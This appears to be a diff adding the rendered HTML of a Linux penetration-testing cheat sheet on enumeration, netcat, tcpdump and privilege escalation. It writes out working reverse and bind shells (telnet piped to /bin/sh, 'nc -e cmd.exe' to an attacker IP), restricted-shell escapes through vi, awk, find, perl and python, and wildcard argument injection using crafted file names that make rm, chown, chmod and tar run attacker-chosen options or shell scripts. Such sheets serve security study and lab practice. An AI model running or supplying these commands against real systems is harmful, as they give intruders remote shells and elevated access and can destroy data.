+<span class="na">ListenStream</span><span class="o">=</span><span class="s">/run/snapd.socket</span>
+<span class="na">ListenStream</span><span class="o">=</span><span class="s">/run/snapd-snap.socket</span>
+<span class="na">SocketMode</span><span class="o">=</span><span class="s">0666</span>
+</pre></div><ul>
+<li><code class="codehilite"><span class="mi">0666</span></code> - Allow any process to connect and communicate with the socket.</li>
+</ul>
+</li>
+</ul>
+<h3 id="networking">Networking<a class="headerlink" href="#networking" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Interface Information
+    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">ifconfig</span> <span class="o">-</span><span class="n">a</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">network</span><span class="o">/</span><span class="n">interfaces</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">network</span>
+</pre></div></li>
+<li>Network configuration
+    <div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">resolv</span><span class="p">.</span><span class="n">conf</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sysconfig</span><span class="o">/</span><span class="n">network</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">networks</span>
+<span class="n">iptables</span> <span class="o">-</span><span class="n">L</span>
+<span class="n">hostname</span>
+<span class="n">dnsdomainname</span>
+</pre></div></li>
+<li>Monitor network communication
+    <div class="codehilite"><pre><span></span><span class="n">lsof</span> <span class="o">-</span><span class="n">i</span>
+<span class="n">lsof</span> <span class="o">-</span><span class="n">i</span> <span class="p">:</span><span class="mi">80</span>
+<span class="n">grep</span> <span class="mi">80</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">services</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">antup</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">antpx</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">tulpn</span>
+<span class="n">chkconfig</span> <span class="c1">--list</span>
+<span class="n">chkconfig</span> <span class="c1">--list | grep 3:on</span>
+<span class="k">last</span>
+<span class="n">w</span>
+</pre></div></li>
+<li>Cached IP and Mac Information
+    <div class="codehilite"><pre><span></span><span class="n">arp</span> <span class="o">-</span><span class="n">e</span>
+<span class="n">route</span>
+<span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">route</span> <span class="o">-</span><span class="n">nee</span>
+</pre></div></li>
+<li>Change IP
+    <div class="codehilite"><pre><span></span><span class="n">ifconfig</span> <span class="n">eth0</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">115</span>
+<span class="n">ifconfig</span> <span class="n">eth0</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">115</span> <span class="n">netmask</span> <span class="mi">255</span><span class="p">.</span><span class="mi">255</span><span class="p">.</span><span class="mi">255</span><span class="p">.</span><span class="mi">0</span> <span class="n">broadcast</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">255</span>
+</pre></div></li>
+<li>Shell with built-in tools
+    <div class="codehilite"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span><span class="err">###</span> <span class="n">Attacker</span><span class="p">.</span> <span class="n">Input</span> <span class="p">(</span><span class="n">Commands</span><span class="p">)</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4445</span><span class="err">###</span> <span class="n">Attacker</span><span class="p">.</span> <span class="n">Ouput</span> <span class="p">(</span><span class="n">Results</span><span class="p">)</span>
+<span class="n">telnet</span> <span class="p">[</span><span class="n">atackers</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44444</span> <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">|</span> <span class="p">[</span><span class="n">local</span> <span class="n">ip</span><span class="p">]</span> <span class="mi">44445</span><span class="err">###</span> <span class="n">On</span> <span class="n">the</span> <span class="n">targets</span> <span class="n">system</span><span class="p">.</span> <span class="n">Use</span> <span class="n">the</span> <span class="n">attackers</span> <span class="n">IP</span><span class="o">!</span>
+</pre></div><ul>
+<li><a href="https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">AF_UNIX</span></code> - Used to communicate between processes on the same machine</li>
+<li><code class="codehilite"><span class="n">AF_INET</span></code> and <code class="codehilite"><span class="n">AF_INET6</span></code> - Used for processes to communicate over a network connection.</li>
+<li>Interact with AF_UNIX Socket
+    <div class="codehilite"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">U</span> <span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">snapd</span><span class="p">.</span><span class="n">socket</span>
+<span class="k">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
+<span class="k">Host</span><span class="p">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
+</pre></div></li>
+</ul>
+<p><strong>Tools</strong></p>
+<ul>
+<li>Ship - one-stop-shop for basic network reconnaissance and addressing: <a href="https://github.com/xtonousou/ship.git">https://github.com/xtonousou/ship.git</a> <a href="https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/">https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/</a> </li>
+</ul>
+<h3 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h3>
+<ul>
+<li>grep<ul>
+<li>Color word root: <code class="codehilite"><span class="n">grep</span> <span class="c1">--color root /etc/passwd</span></code></li>
+<li>OR: <code class="codehilite"><span class="n">grep</span> <span class="o">-</span><span class="n">e</span> <span class="n">how</span> <span class="o">-</span><span class="n">e</span> <span class="k">to</span> <span class="o">-</span><span class="n">e</span> <span class="n">forge</span> <span class="o">*</span><span class="p">.</span><span class="n">txt</span></code>
+  | Option     | Details     |
+  | :--------- | :---------- |
+  | <code class="codehilite"><span class="o">-</span><span class="n">i</span></code>       | Ignore case |
+  | <code class="codehilite"><span class="o">-</span><span class="n">r</span></code> <code class="codehilite"><span class="o">-</span><span class="n">R</span></code>  | Recursive  <code class="codehilite"><span class="n">grep</span> <span class="o">-</span><span class="n">R</span> <span class="ss">&quot;example&quot;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span></code> |
+  | <code class="codehilite"><span class="o">-</span><span class="n">w</span></code>       | Match words |
+  | <code class="codehilite"><span class="o">-</span><span class="n">e</span></code>       | Regex match <code class="codehilite"><span class="n">grep</span> <span class="o">-</span><span class="n">w</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;word1|word2&#39;</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">file</span></code>|
+  | <code class="codehilite"><span class="o">-</span><span class="n">n</span></code>       | Line number |
+  | <code class="codehilite"><span class="o">-</span><span class="k">c</span></code>       | Count |
+  | <code class="codehilite"><span class="o">-</span><span class="n">v</span></code>       | Invert  |
+  | <code class="codehilite"><span class="o">-</span><span class="n">x</span></code>       | Exact match  |
+  | <code class="codehilite"><span class="o">-</span><span class="n">l</span></code>   | File names with match  |
+  | <code class="codehilite"><span class="o">-</span><span class="n">L</span></code>   | File names without match  |</li>
+<li><a href="https://www.howtoforge.com/tutorial/linux-grep-command/">https://www.howtoforge.com/tutorial/linux-grep-command/</a></li>
+</ul>
+</li>
+<li>iptables<ul>
+<li>count packets sent and received
+  <div class="codehilite"><pre><span></span><span class="n">iptables</span> <span class="o">-</span><span class="n">Z</span> <span class="o">&amp;&amp;</span> <span class="n">iptables</span> <span class="o">-</span><span class="n">F</span>
+<span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">INPUT</span> <span class="mi">1</span> <span class="o">-</span><span class="n">s</span> <span class="n">IP</span> <span class="o">-</span><span class="n">j</span> <span class="n">ACCEPT</span>
+<span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="n">OUTOUT</span> <span class="mi">1</span> <span class="o">-</span><span class="n">d</span> <span class="n">IP</span> <span class="o">-</span><span class="n">j</span> <span class="n">ACCEPT</span>
+<span class="n">ip</span> <span class="n">tables</span> <span class="o">-</span><span class="n">vn</span> <span class="o">-</span><span class="n">L</span>
+</pre></div></li>
+</ul>
+</li>
+<li>Netcat<ul>
+<li>Chat
+  <div class="codehilite"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">4444</span>
+<span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mi">4444</span>
+</pre></div></li>
+<li>File Transfer
+  <div class="codehilite"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">nlvp</span> <span class="mi">4444</span> <span class="o">&gt;</span> <span class="n">file</span><span class="p">.</span><span class="n">exe</span>  
+<span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mi">4444</span> <span class="o">&lt;</span> <span class="n">file</span><span class="p">.</span><span class="n">exe</span>
+</pre></div></li>
+<li>Bind Shell<ul>
+<li>VICTIM (server): <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
+<li>ATTACKER (client): <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="o">&lt;</span><span class="n">IP</span> <span class="n">Address</span><span class="o">&gt;</span> <span class="mi">4444</span></code></li>
+</ul>
+</li>
+<li>Reverse Shell<ul>
+<li>ATTACKER (server): <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span></code></li>
+<li>VICTIM (client): <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="o">&lt;</span><span class="n">IP</span> <span class="n">Address</span><span class="o">&gt;</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span></code></li>
+</ul>
+</li>
+<li>NCAT for increased security<ul>
+<li>VICTIM (server): <code class="codehilite"><span class="n">ncat</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">4444</span> <span class="o">-</span><span class="n">e</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="c1">--allow 192.168.30.5 --ssl</span></code></li>
+<li>ATTACKER (client): <code class="codehilite"><span class="n">ncat</span> <span class="o">-</span><span class="n">nv</span> <span class="o">&lt;</span><span class="n">IP</span> <span class="n">Address</span><span class="o">&gt;</span> <span class="mi">4444</span> <span class="c1">--ssl</span></code></li>
+</ul>
+</li>
+<li>Port Scanning<ul>
+<li>TCP Connect Port Scan: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">nvv</span> <span class="o">-</span><span class="n">w</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65550</span></code></li>
+<li>UDP Scan: <code class="codehilite"><span class="n">nc</span> <span class="o">-</span><span class="n">unvv</span> <span class="o">-</span><span class="n">w</span> <span class="mi">1</span> <span class="o">-</span><span class="n">z</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="mi">1</span><span class="o">-</span><span class="mi">65550</span></code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>tcpdump<ul>
+<li>Packet Capture
+  <div class="codehilite"><pre><span></span><span class="n">tcpdump</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">dst</span><span class="w"> </span><span class="o">[</span><span class="n">ip</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">dst</span><span class="w"> </span><span class="o">[</span><span class="n">ip</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">port</span><span class="o">]</span><span class="w"></span>
+<span class="n">tcpdump</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">dst</span><span class="w"> </span><span class="mf">192.168.1.7</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">dst</span><span class="w"> </span><span class="mf">10.5.5.252</span><span class="w"> </span><span class="mi">21</span><span class="w"></span>
+</pre></div></li>
+<li>Open a PCAP: <code class="codehilite"><span class="n">tcpdump</span> <span class="o">-</span><span class="err">­</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span></code></li>
+<li>Cut only IP addresses from the traffic: <code class="codehilite"><span class="n">tcpdump</span> <span class="o">-</span><span class="err">­</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span>  <span class="o">|</span> <span class="n">awk</span><span class="o">-</span><span class="err">­‐</span><span class="n">F</span><span class="ss">&quot; &quot;</span> <span class="s1">&#39;{print $3}&#39;</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="err">­‐</span><span class="n">u</span> <span class="o">|</span> <span class="n">head</span></code></li>
+<li>Filter Destination or Source
+  <div class="codehilite"><pre><span></span><span class="n">tcpdump</span> <span class="o">-</span><span class="n">n</span> <span class="n">src</span> <span class="k">host</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="err">­</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span>
+<span class="n">tcpdump</span> <span class="o">-</span><span class="n">n</span> <span class="n">dst</span> <span class="k">host</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span> <span class="err">‐</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span>
+<span class="n">tcpdump</span> <span class="o">-</span><span class="n">n</span> <span class="n">port</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span> <span class="o">-</span><span class="err">­</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span>
+</pre></div></li>
+<li>Advanced Header Filtering: <code class="codehilite"><span class="n">tcpdump</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">n</span> <span class="s1">&#39;tcp[13] = 24&#39;</span> <span class="o">-</span><span class="err">­‐</span><span class="n">r</span> <span class="n">password_cracking_filtered</span><span class="p">.</span><span class="n">pcap</span></code>
+  <img alt="" src="https://github.com/ayomawdb/cheatsheets/raw/master/.data/.images/tcpdump_001.png" /></li>
+<li>Other important flags<ul>
+<li><code class="codehilite"><span class="o">-</span><span class="n">nn</span></code> stop DNS and service names lookup (performance+)</li>
+<li><code class="codehilite"><span class="o">-</span><span class="n">X</span></code> and <code class="codehilite"><span class="o">-</span><span class="n">XX</span></code> can be used to print each packet in hex and ascii</li>
+<li><code class="codehilite"><span class="o">-</span><span class="n">A</span></code> print packets in ASCII</li>
+<li><code class="codehilite"><span class="o">-</span><span class="n">S</span></code> to print absolute sequence numbers</li>
+<li><code class="codehilite"><span class="o">-</span><span class="n">s</span></code> can be used to increase the default snap-length from 262144 to higher</li>
+<li><code class="codehilite"><span class="o">-</span><span class="n">s</span></code> 0 to capture full packet</li>
+</ul>
+</li>
+<li>References:<ul>
+<li><a href="https://hackertarget.com/tcpdump-examples/">https://hackertarget.com/tcpdump-examples/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="general-exploits">General Exploits<a class="headerlink" href="#general-exploits" title="Permanent link">&para;</a></h2>
+<ul>
+<li>File execution due to not using quotes
+    <div class="codehilite"><pre><span></span><span class="c1"># Files in `SLAPPER_FILES` list will get executed:</span>
+<span class="k">for</span> i in <span class="si">${</span><span class="nv">SLAPPER_FILES</span><span class="si">}</span><span class="p">;</span> <span class="k">do</span>
+<span class="k">if</span> <span class="o">[</span> -f <span class="si">${</span><span class="nv">i</span><span class="si">}</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nv">file_port</span><span class="o">=</span><span class="nv">$file_port</span> <span class="nv">$i</span>
+    <span class="c1"># Correction: file_port=&quot;$file_port $i&quot;</span>
+    <span class="nv">STATUS</span><span class="o">=</span><span class="m">1</span>
+<span class="k">fi</span>
+<span class="k">done</span>
+</pre></div><ul>
+<li>Ref: <a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a></li>
+</ul>
+</li>
+<li>Connect to existing TMUX session: <code class="codehilite"><span class="n">tmux</span> <span class="o">-</span><span class="n">S</span> <span class="o">/</span><span class="p">.</span><span class="n">devs</span><span class="o">/</span><span class="n">dev_sess</span><span class="err">​</span></code></li>
+<li>Screenshot<ul>
+<li>Need <code class="codehilite"><span class="n">video</span></code> group access</li>
+<li>Resolution: <code class="codehilite"><span class="n">cat</span> <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="k">class</span><span class="o">/</span><span class="n">graphics</span><span class="o">/</span><span class="n">fb0</span><span class="o">/</span><span class="n">virtual_size</span></code></li>
+<li>Video feed: Open <code class="codehilite"><span class="err">​</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">fb0</span><span class="err">​</span></code> in a image editor
+  <div class="codehilite"><pre><span></span>cp /dev/fb0 screenshot.raw
+iraw2png <span class="m">1024</span> <span class="m">768</span> &lt; screenshot.raw &gt; screenshot.png
+
+fbdump
+</pre></div></li>
+<li><a href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">https://www.kernel.org/doc/Documentation/fb/framebuffer.txt</a></li>
+</ul>
+</li>
+<li>Escape shell
+    <div class="codehilite"><pre><span></span><span class="n">env</span>
+<span class="n">echo</span> <span class="err">$</span><span class="n">PATH</span>
+<span class="n">echo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">rbin</span><span class="cm">/*</span>
+</pre></div><ul>
+<li>List read only variables (check If PATH or SHELL is writable): <code class="codehilite"><span class="n">export</span> <span class="o">-</span><span class="n">p</span></code></li>
+<li>VI / VIM: <code class="codehilite"><span class="p">:</span><span class="k">set</span> <span class="n">shell</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span></code> <code class="codehilite"><span class="p">:</span><span class="n">shell</span></code> <code class="codehilite"><span class="p">:</span><span class="n">sh</span></code> | <code class="codehilite"><span class="p">:</span><span class="o">!</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span></code>| <code class="codehilite"><span class="p">:</span><span class="n">r</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span></code> | <code class="codehilite"><span class="p">:</span><span class="n">e</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span></code></li>
+<li>AWK: <code class="codehilite"><span class="n">awk</span> <span class="s1">&#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</span></code></li>
+<li>Find: <code class="codehilite"><span class="nv">find</span> <span class="o">/</span> <span class="o">-</span><span class="nv">name</span> <span class="nv">blahblah</span> <span class="o">-</span><span class="k">exec</span> <span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">awk</span> <span class="s1">&#39;</span><span class="s">BEGIN {system(&quot;/bin/sh&quot;)}</span><span class="s1">&#39;</span> \<span class="c1">;</span></code></li>
+<li>More / Less / Man: <code class="codehilite"><span class="o">!</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span></code> <code class="codehilite"><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span></code> <code class="codehilite"><span class="sx">!bash</span></code></li>
+<li>Tee: <code class="codehilite"><span class="n">echo</span> <span class="ss">&quot;evil script code&quot;</span> <span class="o">|</span> <span class="n">tee</span> <span class="n">script</span><span class="p">.</span><span class="n">sh</span></code></li>
+<li>Languages
+  <div class="codehilite"><pre><span></span>python: <span class="nv">exit_code</span> <span class="o">=</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span> <span class="nv">output</span> <span class="o">=</span> os.popen<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>.read<span class="o">()</span>
+perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
+perl: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
+ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
+lua: os.execute<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>
+irb<span class="o">(</span>main:001:0&gt; <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
+</pre></div></li>
+<li>Copy files into <code class="codehilite"><span class="err">$</span><span class="n">PATH</span></code></li>
+<li>Copy file into <code class="codehilite"><span class="n">HOME</span></code> (scp/ftp)</li>
+<li>Some restricted shells will start by running some files in an unrestricted mode (If your <code class="codehilite"><span class="na">.bash_profile</span></code> is executed in an unrestricted mode and it's editable)</li>
+<li>If <code class="codehilite"><span class="n">HISTFILE</span></code> and <code class="codehilite"><span class="n">HISTSIZE</span></code> are writable:<ul>
+<li>Set <code class="codehilite"><span class="n">HISTFILE</span></code> to the file you want to overwrite (preferably an executable)</li>
+<li>Set <code class="codehilite"><span class="n">HISTSIZE</span></code> to 0 and then back to 100,</li>
+<li>Then execute the lines you want in your shell script</li>
+</ul>
+</li>
+<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells</a></li>
+<li><a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></li>
+</ul>
+</li>
+</ul>
+<p><strong>Wildcards</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Char</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">*</td>
+<td align="left">Any number of characters, including none.</td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">Any single character.</td>
+</tr>
+<tr>
+<td align="left">[ ]</td>
+<td align="left">Set of characters, any one of which may match a single character at that position.</td>
+</tr>
+<tr>
+<td align="left">-</td>
+<td align="left">Used within [ ] denotes a range of characters.</td>
+</tr>
+<tr>
+<td align="left">~</td>
+<td align="left">At the beginning of a word expands to the name of your home directory.  If you append another user's login name to the character, it refers to that user's home directory.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Using wildcard to inject arguments
+    <div class="codehilite"><pre><span></span><span class="c1"># ls -al</span>
+drwxrwxr-x.  <span class="m">2</span> leon   leon   <span class="m">4096</span> Oct <span class="m">28</span> <span class="m">17</span>:04 DIR1
+drwxrwxr-x.  <span class="m">2</span> leon   leon   <span class="m">4096</span> Oct <span class="m">28</span> <span class="m">17</span>:04 DIR2
+-rw-rw-r--.  <span class="m">1</span> leon   leon      <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:03 file1.txt
+-rw-rw-r--.  <span class="m">1</span> leon   leon      <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:03 file2.txt
+-rw-rw-r--.  <span class="m">1</span> nobody nobody    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">16</span>:38 -rf
+
+<span class="c1"># rm *</span>
+<span class="c1"># ls -al</span>
+-rw-rw-r--.  <span class="m">1</span> nobody nobody    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">16</span>:38 -rf
+
+<span class="c1"># strace rm *</span>
+execve<span class="o">(</span><span class="s2">&quot;/bin/rm&quot;</span>, <span class="o">[</span><span class="s2">&quot;rm&quot;</span>, <span class="s2">&quot;DIR1&quot;</span>, <span class="s2">&quot;DIR2&quot;</span>, <span class="s2">&quot;file1.txt&quot;</span>, <span class="s2">&quot;file2.txt&quot;</span>, <span class="s2">&quot;-rf&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">25</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
+</pre></div></li>
+<li>chown
+    <div class="codehilite"><pre><span></span><span class="c1">--reference=RFILE</span>
+        <span class="n">use</span> <span class="n">RFILE</span><span class="err">&#39;</span><span class="n">s</span> <span class="k">owner</span> <span class="k">and</span> <span class="k">group</span> <span class="n">rather</span> <span class="k">than</span> <span class="n">specifying</span> <span class="k">OWNER</span><span class="p">:</span><span class="k">GROUP</span> <span class="k">values</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="c1"># ls -la</span>
+-rw-r--r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:40 .drf.php
+-rw-rw-r--.  <span class="m">1</span> user user  <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:35 inc.php
+-rw-rw-r--.  <span class="m">1</span> user user  <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rw-rw-r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:45 --reference<span class="o">=</span>.drf.php
+
+<span class="c1"># chown -R nobody:nobody *.php</span>
+
+<span class="c1"># ls -la</span>
+-rw-r--r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:40 .drf.php
+-rw-rw-r--.  <span class="m">1</span> leon leon  <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:35 inc.php
+-rw-rw-r--.  <span class="m">1</span> leon leon  <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rw-rw-r--.  <span class="m">1</span> leon leon    <span class="m">0</span> Oct <span class="m">28</span> <span class="m">17</span>:45 --reference<span class="o">=</span>.drf.php
+</pre></div></li>
+<li>chmod
+    <div class="codehilite"><pre><span></span>--reference<span class="o">=</span>RFILE
+            use RFILE<span class="err">&#39;</span>s mode instead of MODE values
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="c1"># ls -la</span>
+-rwxrwxrwx.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:40 .drf.php
+-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
+-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:41 --reference<span class="o">=</span>.drf.php
+
+<span class="c1"># chmod 000 *</span>
+
+<span class="c1"># ls -la</span>
+-rwxrwxrwx.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:40 .drf.php
+-rwxrwxrwx.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
+-rwxrwxrwx.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">29</span> <span class="m">00</span>:41 --reference<span class="o">=</span>.drf.php
+</pre></div></li>
+<li>tar command Execution
+    <div class="codehilite"><pre><span></span>--checkpoint<span class="o">[=</span>NUMBER<span class="o">]</span>
+    display progress messages every NUMBERth record <span class="o">(</span>default <span class="m">10</span><span class="o">)</span>
+
+--checkpoint-action<span class="o">=</span>ACTION
+    execute ACTION on each checkpoint
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="c1"># ls -la</span>
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">28</span> <span class="m">19</span>:19 --checkpoint<span class="o">=</span><span class="m">1</span>
+-rw-r--r--.  <span class="m">1</span> leon leon     <span class="m">0</span> Oct <span class="m">28</span> <span class="m">19</span>:17 --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh shell.sh
+-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">117</span> Oct <span class="m">28</span> <span class="m">17</span>:36 inc.php
+-rw-rw-r--.  <span class="m">1</span> user user   <span class="m">111</span> Oct <span class="m">28</span> <span class="m">17</span>:38 index.php
+-rwxr-xr-x.  <span class="m">1</span> leon leon    <span class="m">12</span> Oct <span class="m">28</span> <span class="m">19</span>:17 shell.sh
+
+<span class="c1">#  tar cf archive.tar *</span>
